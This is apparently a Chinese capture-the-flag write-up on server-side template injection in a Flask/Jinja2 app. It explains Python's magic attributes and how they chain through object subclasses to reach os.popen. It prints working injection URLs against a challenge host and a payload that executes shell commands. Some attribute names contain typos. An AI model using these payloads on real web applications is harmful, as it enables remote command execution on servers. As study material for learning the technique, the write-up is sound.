大概就是一个模板注入、magic万岁！！

先打开界面发现告诉我们是模板注入（模板注入就是先写好一个html文件，然后传参即可实现传递（传递数据即可可视化））

这段代码中的 `html` 就是一个简单的模板文件，当开发者想要这个模板对应的样式时，可以直接用 `render_template_string` 方法来调用这个模板，从而直接把这个样式渲染出来。 而模板注入，就是指 **将一串指令代替变量传入模板中让它执行** ，以这段代码为例，我们在传入 `code` 值时，可以用 `{{}}` 符号来包裹一系列代码，以此替代本应是参数的 `id` 

介绍一下魔术方法

```
_class__`：用于返回该对象所属的类，如某个字符串，他的对象为字符串对象，而其所属的类为`<class 'str'>
```

`__bases__`：以元组的形式返回一个类所直接继承的类。

`--base__`：以字符串返回一个类所直接继承的类

`__mro__`：返回解析方法调用的顺序

`__subclassws__()`：获取类的所有子类

`__init__`：所有自带类都包含init方法，便于利用他当跳板来调用globals

流程：

1. \1. 随意找一个内置类对象利用`__class__`拿到该对象所对应的类型
2. \2. 用`__bases__`或`__mro__`拿到基类`<class 'object'>`

```
''.__class__.__bases__[0].__subclasses__()
().__class__.__mro__[2].__subclasses__()
().__class__.__mro__[-1].__subclasses__()
request.__class__.__mro__[1]
```

1. \1. 用`__subclasses__（）`获取所有子类
2. \2. 在子类中寻找可以合适的继承链执行命令或读取文件

在Python中，所有的类都继承自 `object` 类。`object` 是Python中的基类，也被称为根类。它是所有类的顶级父类，包括用户自定义的类和内置的类。

```php
先通过http://61.147.171.105:63458/{{''.__class__.__mro__[2]}}获取其基类object
再找其内置的子类
   http://61.147.171.105:63458/{{''.__class__.__mro__[2].__subclasses__()}}
然后找到71 site._Printer
通过 `__subclasses__()[71].__init__.__globals__['os'].popen('命令行语句').read()` 来执行命令即可到手
```
